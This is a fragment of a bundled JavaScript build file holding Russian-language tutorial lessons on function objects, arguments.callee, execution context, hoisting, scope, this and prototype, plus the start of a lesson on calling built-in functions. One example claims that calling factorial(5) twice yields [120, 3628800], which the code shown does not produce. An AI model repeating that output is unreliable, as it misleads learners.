^^w3schools^^](https://www.w3schools.com/js/js_scope.asp)\n"},38576:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Объект function\n\n_______________________________________\n\n\n**Функция является вызываемым _объектом_**\n**Функция, связанная с объектом через свойство, называется _методом_**\n\n^^![ico-25 file] ECMAScript® 2016 Language Specification^^\n\n_______________________________________________\n\n## ![ico-25 icon] Объект arguments\n\nФункции JavaScript имеют встроенный объект **~arguments~**.\nУ него есть свойство **~length~**, как у массива.\nЕго элементы доступны по индексу, как и элементы массива.\n\n![ico-20 warn] Однако это не массив.\n\n^^Поэтому к нему нельзя применить методы работы с массивами (**~push~**, **~pop~** и т.д.)^^\n^^Его можно преобразовать в обычный массив с помощью метода  **~Array.from~**^^\n\n~~~js\nfunction test () {\n  var args = Array.from(arguments)\n  ...\n}\n~~~\n\nВ объекте **~arguments~**  находятся все аргументы, переданные функции при ее вызове.\nОни будут доступны по индексу строго в том порядке, в каком они были переданы функции при вызове.\n\n◘◘![ico-25 cap] **Пример 1**◘◘\n\n~~~js\nfunction testArguments () {\n  for (var i = 0; i < arguments.length; i++) {\n    console.log(`[${ (i + \' ]\').padEnd(10) } ${ arguments[i] }`)\n  }\n}\n\ntestArguments(27, false, \'Fill\', [7, 4, 5], null)\n~~~\n\n______________________________________\n\n### ![ico-20 icon] arguments.callee\n\nУ объекта **~arguments~** есть свойство **_~callee~_** - ссылка на выполняемую функцию (функцию-"хозяина" объекта  ~arguments~).\n\n~~~js\nfunction testArguments () {\n  console.log(arguments.callee.name)\n}\n\ntestArguments() // testArguments\n~~~\n\n^^^[Пример 2]\n\n^^Объявим функцию  **~getArguments~**:^^\n\n~~~js\nfunction getArguments (param) {\n  return param ? param : arguments.callee\n}\n~~~\n\n^^которая, если ей был передан аргумент, возвращает значение этого аргумента, в противном случае возвращает ссылку на саму себя.^^\n\n^^Теперь вызовем эту функцию с параметром и без:^^\n\n~~~js\nvar x = getArguments()\nvar y = getArguments(\'Привет!\')\n~~~\n\n^^результат вызова функции без аргументов мы поместили в переменную  **~ x ~**,^^\n^^а результат вызова с аргументом "Привет!" мы поместили в переменную  **~ y ~**^^\n\n^^Теперь выведем в консоль переменные **~ x ~** и **~ y ~**^^\n\n^^в переменной **~ x ~** находится точная копия функции **~getArguments~**^^\n\n^^а в переменной **~ y ~** - строка "Привет!"^^\n\n^^Вызовем функцию **~ x ~**:^^\n\n~~~js\nx(\'До свидания!\')\n~~~\n\nи получим строку \'До свидания!\'\n\n^^^\n\n^^^[Пример 3]\n\n![ico-25 cap] ** 3 **\n\n^^Объявим функцию, которая "сама себя лечит", т.е. сама добавляет себе свойства и методы:^^\n\n~~~js\nfunction setProperty (prop, val) {\n  arguments.callee[prop] = val\n}\n~~~\n\n^^Теперь заставим ее создать себе парочку свойств:^^\n\n~~~js\nsetProperty(\'isActive\', false)\nsetProperty(\'value\', 50)\n~~~\n\n^^Ну, и для пущей убедительности заставим ее создать себе метод:^^\n\n~~~js\nsetProperty(\'method\', function () {\n  console.log(\'А еще я умею вышивать крестиком\')\n})\n~~~\n\n^^здесь мы передаем ей в качестве второго аргумента функцию^^\n\n^^Теперь проверим, что эти свойства и метод появились у функции  **~setProperty~**^^\n\n^^Выведем в консоль свойства **~isActive~** и **~value~**   функции  **~setProperty~**  и вызовем ее метод  **~method~**^^\n\n^^^\n\n^^^[Пример 4]\n\n![ico-25 cap] ** 4 **\n\n^^Создадим функцию, которая "накапливает" результаты собственных вычислений^^\n\n^^Пусть это будет функция, вычисляющая факториал числа^^\n\n~~~js\nvar factorial = function (num) {\n  var res = 1, n = 1\n  while (n <= num) res *= n++\n}\n~~~\n\n^^"модифицируем" ее следующим образом:^^\n\n~~~js\nvar factorial = function (num) {\n  if (!arguments.callee.res) arguments.callee.res = []\n  var res = 1, n = 1\n  while (n <= num) res *= n++\n  arguments.callee.res.push(res)\n  return res\n}\n~~~\n\n^^Вызовем ее с различными значениями аргумента и выведем в консоль значение свойства **~res~**:^^\n\n~~~js\nfactorial(5)\nfactorial(5)\n\nconsole.log(factorial.res)\n~~~\n\n^^Получим массив ~[120, 3628800]~^^\n\n^^^\n\n^^![ico-20 warn] Следующий пример лучше рассмотреть после изучения событий элементов DOM^^\n\n^^^[Пример 5]\n\n![ico-25 cap] ** 5 **\n\n^^В этом примере создаются анонимные функции, которые обрабатывают событие **~click~**  кнопок^^\n\n^^Каждая функция "накапливает" данные о времени клика на кнопке в массиве **~arguments.callee.res~**^^\n\n~~~js\nvar buttons = []\n\nfor (var n = 0; n < 5; n++) {\n  buttons[n] = document.body\n    .appendChild(document.createElement(\'button\'))\n  buttons[n].innerText = n\n  buttons[n].onclick = function (event) {\n    if (!arguments.callee.res) arguments.callee.res = []\n    arguments.callee.res.push(Math.round(event.timeStamp))\n    console.log(arguments.callee.res)\n  }\n}\n~~~\n\n^^Модифицируем этот код:^^\n\n~~~js\nvar buttons = []\n\nfor (var n = 0; n < 5; n++) {\n  buttons[n] = document.body\n    .appendChild(document.createElement(\'button\'))\n  buttons[n].innerText = 0\n  buttons[n].style = \'padding: 8px 16px\'\n  buttons[n].onclick = function (event) {\n    var func = arguments.callee\n    if (!func.clicksTime) func.clicksTime = []\n    func.clicksTime.push(Math.round(event.timeStamp))\n    console.log(func.clicksTime)\n    var len = func.clicksTime.length\n    event.target.innerText = len\n    func.res = len > 1\n      ? func.clicksTime[len - 1] - func.clicksTime[len - 2]\n      : 0\n    console.info(`Интервал между последними кликами: ${func.res}`)\n  }\n}\n~~~\n\n^^Что теперь делает каждый обработчик клика на кнопке ?^^\n\n^^^\n\n_______________________________________________\n\n## ![ico-25 icon] Вызываемый объект\n\nВ этом смысле функцию можно сравнить с ![ico-30 ambulance]\nКак и ![ico-20 ambulance], функция может перемещаться от одного объекта к другому (откуда она вызвана).\n\nПри этом объекты, вызывающие функцию, являются **контекстом вызова**.\n\nСама функция должна иметь "инструменты" для выполнения своей задачи в контексте вызова.\n\nВсе эти инструменты, не относящиеся к контексту вызова, а находящиеся исключительно в распоряжении функции, относятся к **контексту исполнения**.\n\nИтак, куда поедет ![ico-20 ambulance] - это **контекст вызова**.\nЧто находится внутри ![ico-20 ambulance] - это **контекст исполнения**.\n\n^^^[Контекст исполнения]\n\n![ico-30 ambulance]\n\n| **свойства** ^^(переменные)^^ | **методы** ^^(функции)^^ |\n| ^^комплект инструментов, медикаментов, перевязочных матералов, различные приборы (капельницы, дефибриллятор, аппарат искусственного дыхания и т.д.)^^ | ^^профессиональные навыки персонала машины скорой помощи (могут сделать укол, поставить капельницу, применить дефибриллятор, перенести больного на носилках и т.д.)^^ |\n\n^^Все это функция ![ico-20 ambulance] возит с собой^^\n\n^^^\n\n^^^[Контекст вызова]\n\n![ico-30 ambulance]\n\n^^• конкретные условия (частный дом, квартира в многоэтажке, наличие или отсутствие лифта, водопровода и т.д.)^^\n^^• конкретный больной с конкретными симптомами, возрастом, историей болезни, характером и т.д.^^\n\n^^^\n\n## ![ico-25 icon] Контекст вызова\n\nКонтекст вызова - это **объект**.\n\nОбычно при вызове функции имя этого объекта стоит перед именем функции, и отделено от него точкой:\n\n~~~js\npatient.emergency()\n~~~\n\nКак правило, если имя объекта перед именем функции не указано, то контекстом вызова функции является глобальный объект **~window~**.\n\n^^Исключение составляют функции, контекст вызова которых установлен с помощью метода ~bind()~.^^\n\n![ico-20 warn] Отсюда следует, что все функции JS являются методами\nЕсли объект ("хозяин" метода) не указан, подразумевается глобальный объект\n\n_______________________________\n\n^^^[Пример 6]\n\n![ico-25 cap] ** 6 **\n\n^^Объявим три функции:^^\n\n~~~js\nfunction first () {\n  console.log(\'Function "first" is working now.\')\n}\nfunction second () {\n  console.log(\'Function "second" is working now.\')\n}\nfunction third () {\n  console.log(\'Function "third" is working now.\')\n}\n~~~\n\n^^Все три функции объявлены в глобальном контексте, то есть они являются методами глобального объекта **~window~**.^^\n\n^^Как мы уже знаем, можно обращаться к свойствам объекта как к элементам ассициативного массива.^^\n\n^^Тогда конструкция:^^\n\n~~~js\nwindow[\'first\']\n~~~\n\n^^вернет нам функцию  **~first~**, которая является свойством (методом) глобального объекта **~window~**.^^\n\n^^Для вызова этой функции не хватает только круглых скобок:^^\n\n~~~js\nwindow[\'first\']()\n~~~\n\n^^Используя этот факт, мы можем вызывать функцию, имя которой нам передано в переменной типа "_string_":^^\n\n~~~js\nfor (var funcName of [\'first\', \'second\', \'third\']) window[funcName]()\n~~~\n\n^^^\n\n____________________________\n\n### ![ico-20 icon] Ссылка на контекст вызова\n\nПри вызове бригады скорой помощи она получает ссылку на объект вызова.\n\nБригаде нужно знать, куда ехать, симптомы больного, возраст и т.д.\n\nТочно так же функция должна иметь доступ к объекту, который ее вызывает, его свойствам, которые могут быть необходимы для нормальной работы функции.\n\nВнутри функции ключевое слово  **~this~** является ссылкой на объект, в контексте которого вызвана функция (т.е. на контекст вызова).\n\n![ico-25 cap] Например, для функции ![ico-20 ambulance]\n\n^^![ico-20 green-ok] this.адрес^^\n^^![ico-20 green-ok] this.этаж^^\n^^![ico-20 green-ok] this.квартира^^\n^^![ico-20 green-ok] this.больной.имя^^\n^^![ico-20 green-ok] this.больной.возраст^^\n^^![ico-20 green-ok] this.больной.симптомы^^\n...\n\n^^Если бы не  **~this~**, вряд ли функция могла бы помочь "больному" ![ico-20 smile].^^\n\n_________________________________________\n\n## ![ico-25 icon] Контекст исполнения\n\n![ico-20 warn] Каждый вызов функции приводит к созданию нового контекста выполнения.\n\nСоздание контекста выполнения происходит до начала выполнения кода.\n\nПри каждом возврате (**~return~**) происходит выход из контекста выполнения.\nПока выполнение функции не завершено, ее контекст будет активным.\nПоскольку функции могут вызывать друг друга, их контекст помещается в стек.\n![](illustrations/function-object-01.png)\n^^(очередь: последним пришел - первым ушел)^^\nВерхним в этом стеке всегда будет текущий контекст исполнения.\n\n![](illustrations/function-object-02.png)\n\nЧто же будет в этом контексте?\n\n![ico-20 green-ok] LexicalEnvironment\n![ico-20 green-ok] Цепочка областей видимости\n![ico-20 green-ok] ~this~\n\n_____________________________________________\n\n### ![ico-20 icon] Lexical Environment\n\n^^Когда происходит вызов функции, она активируется.^^\n^^Ей нужно где-то безопасно "разместить" свои данные, с которыми она будет работать.^^\n^^Кроме аргументов, которые она получит при вызове, у нее могут быть свои внутренние данные, которые нужны для временного хранения промежуточных результатов вычислений.^^\n\nПри вызове функции создается объект, содержащий все необходимые переменные.\nЭтот объект в спецификации языка называется **~LexicalEnvironment~.**\n\n~Lexical Environment~ содержит аргументы функции и все объявленные внутри функции переменные (включая функции).\n\n^^поэтому его еще называют _объектом переменных_ или _объектом активации_.^^\n\n^^Таким образом, объект активации можно сравнить со шкафчиком для хранения "личных вещей" функции.^^\n\n^^![ico-20 warn] Получить доступ к объекту активации невозможно.^^\n\n______________________________________________\n\n### ![ico-20 icon] hoisting\n\nИтак, после вызова функции:\n\n| ** 1** |   | **Формируется контекст исполнения**                      |\n|        | • | ^^создается объект активации ( ~Lexical Environment~ )^^ |\n|        | • | ^^определяется область видимости^^                       |\n|        | • | ^^устанавливается значение **~this~**^^                  |\n| ** 2** |   | **Код интерпретируется и выполняется**                   |\n\n![ico-20 warn] Обратите внимание на тот факт, что объявления всех внутренних переменных и вложенных функций происходит раньше, чем код начинает выполняться, независимо от порядка их появления в коде.\n![ico-20 warn] А вот присвоение переменным значений происходит, когда код начинает выполняться.\nЭто приводит к "поднятию" (**hoisting**) объявлений переменных и функций.\n\n^^^[Пример 7]\n\n![ico-25 cap] ** 7 **\n\n~~~js\nfunction delegat () {\n  console.log(x)\n  y = x + 5\n  console.log(y)\n  x = 5, y = 10\n\n  return  x * 4 +  y / 2\n\n  var x = 1, y = 1\n}\n~~~\n\n^^Хотя объявление переменных  **_~ x~_** и **_~ y~_** стоит в коде после оператора ~return~, при формировании контекста исполнения на первом этапе будет формироваться объект активации (Lexical Environment), и все переменные, объявленные внутри функции, будут включены в этот объект.^^\n\n^^Таким образом, объявление переменных **_~ x~_** и **_~ y~_** "поднимется" (произойдет до начала выполнения кода функции).^^\n\n^^Но присваивание значений происходит уже на втором этапе, и код будет выполняться последовательно, то есть на момент исполнения кода.^^\n\n~~~js\nconsole.log(x)\n~~~\n\n^^значение переменной  **_~ x~_**  еще не будет определено, поэтому в консоли будет ~undefined~.^^\n\n^^Аналогично, на момент выполнения кода^^\n\n~~~js\ny = x + 5\n~~~\n\n^^значение переменной  **_~ x~_**  будет  ~undefined~, поэтому результатом операции присваивания будет  **~NaN~**,  что и выдаст в консоль код.^^\n\n~~~js\nconsole.log(y)\n~~~\n\n^^После этого будет выполнен код^^\n\n~~~js\nx = 5, y = 10\n~~~\n\n^^Переменные **_~ x~_** и **_~ y~_** получат значения.^^\n\n^^Поэтому функция вернет значение **25**.^^\n\n^^Присваивание значений^^\n\n~~~js\nx = 1, y = 1\n~~~\n\n^^не произойдет, поскольку выход из контекста выполнения будет раньше этого кода.^^\n\n^^^\n\n^^^[Пример 8]\n\n![ico-25 cap] ** 8**\n\n~~~js\nvar treg = 5\n\nfunction delegat () {\n  treg = 10\n  return\n\n  function treg () {\n    return\n  }\n}\ndelegat()\nconsole.log(treg)  // 5\n~~~\n\n^^В этом случае объявление функции  **~treg~**  попадет в _Lexical Environment_ функции  **~delegat~** на этапе создания ее контекста выполнения, и не затронет переменную  **~treg~**,  объявленную в глобальном контексте.^^\n\n^^Это будут разные переменные,  хотя идентификаторы у них совпадают.^^\n\n^^Поэтому  в результате в консоли будет ** 5**.^^\n\n^^^\n\n________________________________\n\n### ![ico-20 icon] Область видимости\n\nОбласть видимости (**~scope~**) ограничивает действие идентификаторов переменных и функций.\n\n^^^[scope]\n\n^^Представьте себе двух человек по имени Саша: 👨‍💼 парня и 🙎 девушку^^\n\n^^Есть две комнаты, ^^\n^^и парень Саша  👨‍💼 находится в первой комнате, ^^\n^^а девушка Саша 🙎 - во второй^^\n\n^^В каждой комнате есть наблюдатель^^\n\n^^Если мы спросим наблюдателя из первой комнаты: ^^\n^^_"Кем является Саша?"_, ^^\n^^то он ответит: _"Парень"_ 👨‍💼^^\n\n^^Зададим аналогичный вопрос наблюдателю из второй комнаты, ^^\n^^и получим ответ: _"Девушка"_ 🙎^^\n\n^^Это происходит потому, что у каждой комнаты есть своя область видимости^^\n\n_________________________________\n\n^^Однако область видимости вложенных функций будет несколько иной^^\n\n^^Предположим, что вложенные функции - коробки со стенками из тонированного стекла^^\n^^Наши функции-коробки вложены одна в другую, как матрешки: ^^\n^^вторая коробка находится внутри первой,^^\n^^третья - внутри второй, и так далее...^^\n\n^^Наблюдатель в коробке 2 будет видеть не только содержимое коробки 2, ^^\n^^но и содержимое коробки 1 ^^\n^^и комнаты, внутри которой находятся все коробки^^\n\n^^но он не может увидеть содержимое коробки 3, ^^\n^^хотя наблюдатель в коробке 3 его отлично видит... ^^\n^^как и наблюдателей во всех остальных коробках ^^\n^^и в комнате^^\n\n____________________________\n\n^^Таким образом, если внутри функции будет обращение к переменной, то сначала функция будет искать эту переменную в своем "шкафчике для личных вещей", и если не найдет, то не постесняется "позаимствовать" эту переменную из внешнего шкафчика, внутри которого она находится^^\n\n___________________________\n\n^^![ico-20 warn] Все доступные ей чужие "шкафчики" представляют собой ![ico-20 pin] **_цепочку областей видимости_** функции, которая является частью ее ![ico-20 pin] **контекста выполнения**.^^\n\n^^^\n\n^^^[Пример 9]\n\n![ico-25 cap] ** 9**\n\n~~~js\nvar sample = 1\n\nfunction changeSample () {\n  sample = 10\n}\n\nchangeSample()\n~~~\n\n^^переменная **~sample~**   объявлена в глобальной области видимости, в которой  также объявлена функция **~changeSample~**.^^\n\n^^При объявлении переменной **~sample~** присвоено значение 1.^^\n\n^^Поскольку внутри функции **~changeSample~**  нет объявления переменной **~sample~**, то при формировании контекста выполнения функции **~changeSample~** эта переменная не попадает в объект активации ("шкафчик для личных вещей") функции **~changeSample~**.^^\n\n^^Тогда при выполнении присваивания^^\n\n~~~js\nsample = 10\n~~~\n\n^^происходит следующее:^^\n\n^^функция **~changeSample~**, не найдя такой переменной в собственном "шкафчике", обращается к внешнему "шкафчику", где такая переменная есть, ей-то и будет присвоено значение 10.^^\n\n^^Таким образом, для каждого контекста выполнения существует своя  цепочка областей видимости.^^\n\n^^Цепочка областей видимости включает области видимости всех предыдущих контекстов в стеке.^^\n\n^^^\n\n^^^[Пример 10]\n\n![ico-25 cap] **10**\n\n~~~js\nvar sample = 1\n\nfunction showSample () {\n  console.info(\'We are in the execution context of the function "showSample"\')\n  console.info(`sample === ${sample}`)\n\n  return\n\n  function sample () {}\n}\n\nshowSample()\n\nconsole.info(\'We left the execution context of the function "showSample"\')\nconsole.info(`Now sample === ${sample}`)\n~~~\n\n**Результат в консоли:**\n\n~~~console\nWe are in the execution context of the function "showSample"\nsample === function sample () {}\nWe left the execution context of the function "showSample"\nNow sample === 1\n~~~\n\n^^В этом примере показано, как работает механизм **hoisting**.^^\n^^Переменная **~sample~**  объявляется в глобальной области видимости с присвоением ей значения 1.^^\n^^Внутри тела функции **~showSample~** после оператора return объявляется функция **~sample~**.^^\n^^На первый взгляд, при последовательном выполнении кода это объявление не должно сработать, поскольку оператор ~return~ стоит выше.^^\n^^Однако все объявления собираются в объект активации до того, как код начинает выполняться.^^\n^^Поэтому на момент, когда начнется выполнение кода функции **~showSample~**, функция **~sample~** будет уже  объявлена и будет благополучно находиться в ~Lexical Environment~ функции **~showSample~**.^^\n^^Благодаря этому объявления переменных и функций "поднимаются" в области видимости "родителя" (в нашем случае "родителем" является функция **~showSample~**).^^\n^^Убедиться в этом позволяет вывод в консоль переменной **~sample~**.^^\n^^После завершения выполнения кода функции **~showSample~** ее контекст будет "демонтирован", и опять активным станет глобальный контекст, в котором  переменная **~sample~**  имеет значение 1.^^\n\n^^^\n\n^^^[Пример 11]\n\n![ico-25 cap] **11**\n\n~~~js\nvar sample = 1\n\nfunction showSample () {\n  console.info(\'We are in the execution context of the function "showSample"\')\n  console.info(`(1) ${sample}`)\n  sample()\n  console.info(`(2) ${sample}`)\n  sample = 10\n  console.info(`(3) ${sample}`)\n\n  return\n\n  function sample () { sample = 5 }\n}\n\nshowSample()\n\nconsole.info(`(global) ${sample}`)\n~~~\n\n^^Здесь так же происходит поднятие объявления функции  **~sample()~**.^^\n^^Но функция  **~sample()~**  переопределяет значение  переменной  **~sample~**.^^\n^^В контексте выполнения функции  **~showSample~** на момент присваивания переменной **~sample~** значения 5 нет другой объявленной переменной **~sample~**, кроме самой функции  **~sample()~**.^^\n^^Таким образом, до вызова функции  **~sample()~** в консоль будет выведена функция.^^\n^^После вызова функции  **~sample()~** в консоль будет выведено новое значение (5) переменной **~sample~**.^^\n^^После этого будет выполнено присваивание нового значения переменной **~sample~**  и вывод в консоль (10).^^\n^^Когда функция **~showSample~** завершит работу, и ее контекст будет "демонтирован", станет активным глобальный контекст, в котором переменная **~sample~** имеет значение 1.^^\n\n^^В этом примере функция **~sample()~** переопределила саму себя (была "function", стала "number").^^\n\n^^^\n\n____________________________________\n\n### ![ico-20 icon] Цепочка областей видимости\n\nИтак, функция может использовать какие-то переменные, которых нет в ее ~LexicalEnvironment~.\n\n^^Они являются внешними, и находятся в другом контексте.^^\n^^Но они доступны функции.^^\n^^Функция "видит" их, поэтому они находятся в ее _области видимости_.^^\n\n^^Когда внутри функции происходит обращение к переменной или функции, в первую очередь движок будет искать эту переменную в ~LexicalEnvironment~ функции, если ее там не окажется - то поиск будет продолжен по цепочке областей видимости.^^\n\n^^Если переменная (или функция) не будет обнаружена, будет сгенерировано исключение ![ico-20 err] ~ReferenceError~.^^\n\n_______________________________________\n\n### ![ico-20 icon] this\n\n**~this~** - это еще одна составляющая контекста исполнения функции.\n\n**~this~** является ссылкой на контекст вызова функции.\n\n![](images/reference-lockpick-ukr.png)\n\nС помощью ключевого слова  **~this~**  можно получить доступ из функции (или метода) к свойствам объекта, в контексте которого была вызвана функция.\n\n_______________________________\n\n![ico-25 cap] **12**\n\n~~~js\nfunction func () {\n  console.log(this)\n}\n~~~\n\nпри вызове функции  **~func()~** в консоль будет выведен объект  ~window~.\nВнутри  функции  **~func()~** ~this~ указывает на объект  ~window~.\n\n________________________________\n\n![ico-25 cap] **13**\n\n~~~js\nfunction func () {\n  child()\n\n  function child () {\n    console.log(\'child this: \', this)\n  }\n}\n\nfunc()  // window\n~~~\n\n___________________________________\n\n![ico-25 cap] **14**\n\nЕсли же функция является методом объекта, то ее контекстом вызова будет этот объект.\n\n~~~js\nvar human = {\n  name: \'Ivan\',\n  say: function () {\n    console.log(\'this: \', this)\n  }\n}\n\nhuman.say() // будет выведен объект  human\n~~~\n\n________________________________\n\n![ico-25 cap] **15**\n\nТеперь посмотрим на функцию как на объект.\n\n~~~js\nfunction say () {\n  console.log(\'function say: this: \', this)\n}\n\nfunction girl () {\n  console.log(\'function girl: this: \', this)\n}\n~~~\n\nДобавим функции  **~girl~**  свойство  **~say~** и вызовем функцию ~girl~ и ее свойство ~say~:\n\n~~~js\ngirl.say = say\ngirl.say()     //  girl\ngirl()         // window\n~~~\n\n________________________________________\n\n## ![ico-25 icon] prototype\n\n• Функцию как **_объект_** нельзя вывести с помощью метода ~console.log~\n• Для этой цели следует использовать метод **~console.dir~**\n\n~~~js\nfunction sample () {}\n\nconsole.dir(sample)\n~~~\n\nВ консоли мы получим следующую картинку:\n~~~console\n▼ ƒ sample()\n      arguments: null\n      caller: null\n      length: 0\n      name: "sample"\n    ▼ prototype:\n        ▶ constructor: ƒ sample()\n        ▶ __proto__: Object\n    ▶ __proto__: ƒ ()\n      [[FunctionLocation]]: VM476:1\n    ▼ [[Scopes]]: Scopes[1]\n        ▶ 0: Global {type: "global", name: "", object: Window}\n~~~\n\n![ico-25 warn] Обратите внимание на свойство **_~prototype~_**, которое есть **только у функций**.\n![](images/function-balls-ukr.png)\n![ico-20 pin] свойство **_~prototype~_** функций - это объект.\n![ico-20 pin] в этом объекте есть свойство **~constructor~**.\n![ico-20 pin] свойство **~constructor~** - это ссылка на саму функцию **_~sample()~_**.\n\nТаким образом, функция генетически является конструктором, что явным образом прописано в ее свойстве **_~prototype~_**.\n\n_____________________\n\nОбратите также внимание на свойство **~&#95;&#95;proto&#95;&#95;~**, которое мы разберем далее\n![ico-20 pin] это **ссылка** на объект, от которого функция унаследовала свои свойства и методы\n![ico-20 pin] любая функция создается встроенным нативным объектом (конструктором) **Function**\n^^(что свидетельствует о том, что функция - это **объект**).^^\n![ico-20 pin] свойство **~constructor~** в **~&#95;&#95;proto&#95;&#95;~** - это ссылка на **Function**.\n\n^^~[[FunctionLocation]]~ и ~[[Scopes]]~ добавляет Chrome DevTools для целей отладки^^\n\n___________________________________\n\n## [![ico-30 hw] Упражнения](test/functionObject)\n\n[![ico-20 link] ^^w3schools^^](https://www.w3schools.com/js/js_scope.asp)\n'},98606:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Функции\n\n@@@@\nСейчас мы научимся работать с еще одним очень важным типом данных: **~function~**.<br>На функциях держится вся наша \"вселенная JS\".<br><br>**Функции - это ссылочный тип данных**.<br><br>Это означает, что после объявления функции у нас \"в руках\" будет переменная, в которой будет ссылка на функцию.\n![](images/funcs-are-our-jam.svg)\n@@@@\n\nКогда кто-то болеет, то вызывают врача, когда возникают проблемы с водопроводом или канализацией - вызывают сантехника, а когда проблемы с проводкой в доме - вызывают электрика. Хорошо, что есть врачи, сантехники и электрики. Обратите внимание, что они не живут у нас в доме и не делают свою работу постоянно. Иначе в нашем доме был бы ад, толпы людей, которые все время что-то делают... Нет-нет, мы вызываем их только тогда, когда возникает необходимость. Они приходят, делают свою работу и уходят. Но у нас остается телефон или другой способ их вызова, если проблема возникнет опять.\n\nТо же самое с функциями.\nКаждая функция умеет что-то делать.\nКаждая функция может быть вызвана, когда возникнет необходимость.\n\nДавайте для начала научимся их вызывать.\n^^Действительно, если есть готовая дрель, то стоит научиться ею пользоваться ![ico-20 wink].^^\n\n## ![ico-30 icon] Вызов функции\n\nУ нас есть много встроенных функций, а также есть функции, которые предоставляет нам браузер.\nВызов функции состоит из двух частей: имени функции и следующих за именем функции круглых скобок, в которых могут быть переданы **аргументы**, т.е. какие-то данные, которые функция будет использовать в своей работе.\n\nЕсть функции, которые не требуют передачи **аругментов** при вызове. В этом случае вы можете вызвать такую функцию с пустыми круглыми скобками, но ![ico-20 warn]  круглые скобки должны быть обязательно. Если вы передадите такой функции аргументы, она их просто проигнорирует, поскольку они не нужны для ее работы. Если вы передатите агрументов больше, чем надо, лишние аргументы будут отброшены.\n\n### ![ico-25 icon] console.log\n\nНапример, мы пользуемся консолью браузера, и код, который мы набираем в консоли, автоматически исполняется после нажатия _Enter_.\nНо до сих пор мы не знали, что можем обратиться к консоли напрямую (**~console~**) и вызвать одну из ее функций:\n\n§§§§ Demo | function_console_template §§§§\n\n![ico-25 warn] Для того, чтобы набрать в консоли многострочный код, используйте сочетание клавиш ~_Shift_ + _Enter_~, поскольку _Enter_ сразу запускает набранную строчку кода на исполнение:\n\n§§§§ Demo | function_console_01_template §§§§\n\nТеперь с помощью ~_Shift_ + _Enter_~ мы можем объявить объект:\n\n§§§§ Demo | function_console_02_template §§§§\n\n_________________________________________________\n\n### ![ico-25 icon] parseInt\n\nВ нашем распоряжении так же несколько очень полезных встроенных функций, например, **~parseInt~**, которая пасит переданный ей аргумент как целое число.\nЕсли это строка, начинающаяся с цифр, то остальная часть строки отбрасывается, и возвращается целая часть числа, состоящего из этих цифр.\nЕсли это число с плавающей точкой, то возвращается целая часть числа.\nЕсли это что-то, что не приводится к числу, то возвращается **~NaN~**:\n\n§§§§ Demo | function_parseInt_template §§§§\n\nКак видите, эта функция ждет агумент при вызове, и если вы его не передадите, т.е. вызовете функцию с пустыми круглыми скобками:\n\n~~~js\nparseInt()\n~~~\n\nто значением аргумента будет **~undefined~**.\n\nОднако эта функция может принимать и **второй аргумент**.\nПо умолчанию этот аргумент равен **10**.\nЕсли вы укажете 2, то первый аргумент будет рассматриваться как число в **двоичной системе исчисления**. Если в этом случае первый аргумент будет содержать цифры, отличные от 0 или 1, то функция **~parseInt~** вернет **~NaN~**.\nЕсли вторым аргументом вы передадите 8, то первый аргумент будет рассматриваться как число в **восьмеричной системе исчисления**.\nЕсли вторым аргументом вы передадите 16, то первый аргумент будет рассматриваться как число в **шестнадцатеричной системе исчисления**.\n\n§§§§ Demo | function_parseInt_01_template §§§§\n\n**Возвращаемое значение всегда будет десятичным числом**.\n\n_____________________________________________________________________\n\n### ![ico-25 icon] Библиотека Math\n\nТак же у нас есть встроенная библиотека математических функций **Math**.\n\nМы можем посмотреть в консоли ее содержимое:\n\n~~~js\nconsole.log(Math)\n~~~\n\nИ увидим длинный список всех математических констант (например, число PI), а так же функций:\n\n~~~~console\n▼ Math {abs: ƒ, acos: ƒ, acosh: ƒ, asin: ƒ, asinh: ƒ, …}\n    E: 2.718281828459045\n    LN2: 0.6931471805599453\n    LN10: 2.302585092994046\n    LOG2E: 1.4426950408889634\n    LOG10E: 0.4342944819032518\n    PI: 3.141592653589793\n    SQRT1_2: 0.7071067811865476\n    SQRT2: 1.4142135623730951\n  ► abs: ƒ abs()\n  ► acos: ƒ acos()\n  ► acosh: ƒ acosh()\n  ► asin: ƒ asin()\n  ► asinh: ƒ asinh()\n  ► atan: ƒ atan()\n  ► atan2: ƒ atan2()\n  ► atanh: ƒ atanh()\n  ► cbrt: ƒ cbrt()\n  ► ceil: ƒ ceil()\n  ► clz32: ƒ clz32()\n  ► cos: ƒ cos()\n  ► cosh: ƒ cosh()\n  ► exp: ƒ exp()\n  ► expm1: ƒ expm1()\n  ► floor: ƒ floor()\n  ► fround: ƒ fround()\n  ► hypot: ƒ hypot()\n  ► imul: ƒ imul()\n  ► log: ƒ log()\n  ► log1p: ƒ log1p()\n  ► log2: ƒ log2()\n  ► log10: ƒ log10()\n  ► max: ƒ max()\n  ► min: ƒ min()\n  ► pow: ƒ pow()\n  ► random: ƒ random()\n  ► round: ƒ round()\n  ► sign: ƒ sign()\n  ► sin: ƒ sin()\n  ► sinh: ƒ sinh()\n  ► sqrt: ƒ sqrt()\n  ► tan: ƒ tan()\n  ► tanh: ƒ tanh()\n  ► trunc: ƒ trunc()\n    Symbol(Symbol.toStringTag): \"Math\"\n  ► [[Prototype]]: Object\n~~~~\n\n^^Обратите внимание, что имена констант пишутся в верхнем регистре, т.е. заглавными буквами.^^\n^^Функции выделяются литерой **~ ƒ~** и обязательно имеют имя. Иначе как бы мы их вызвали?^^\n\n~~~console\nround: ƒ round()\n~~~\n\nПопробуем вызвать некоторые функции библиотеки **Math**:\n\n§§§§ Demo | function_math_template §§§§\n\nВ круглых скобках мы передаем функциям при вызове **аргументы**.\nНапример, мы передаем функции извлечения квадратного корня число 16 при вызове:\n\n~~~console\nMath.sqrt(16)\n~~~\n\nи получаем результат: 4.\n\nТ.е. все математические функции возвращают **значение**.\n\nПосмотрим на такой оператор присваивания:\n\n~~~js\nvar sin = Math.sin(Math.PI / 2)\n~~~\n\nВ правой части оператора присваивания находится **выражение**.\nДля того, чтобы выполнить присваивание, движок должен вычислить **значение** выражения в правой части, а для этого вызвать функцию и передать ей число.\nНо в круглых скобках вызова функции опять стоит **выражение** ~Math.PI / 2~.\nТ.е. движок должен сначала вычислить выражение в круглых скобках, и затем полученное значение передать функции ~Math.sin~ при вызове.\n\n§§§§ Demo | function_math_01_template §§§§\n\nОбратите внимание, что когда мы запускаем на исполнение в консоли код:\n\n~~~console\nvar argument = Math.PI / 2\n~~~\n\nто консоль возвращает ~undefined~.\n\nЭто происходит потому, что оператор присваивания не возвращает никакого значения.\n\nА вот когда мы запрашиваем значение 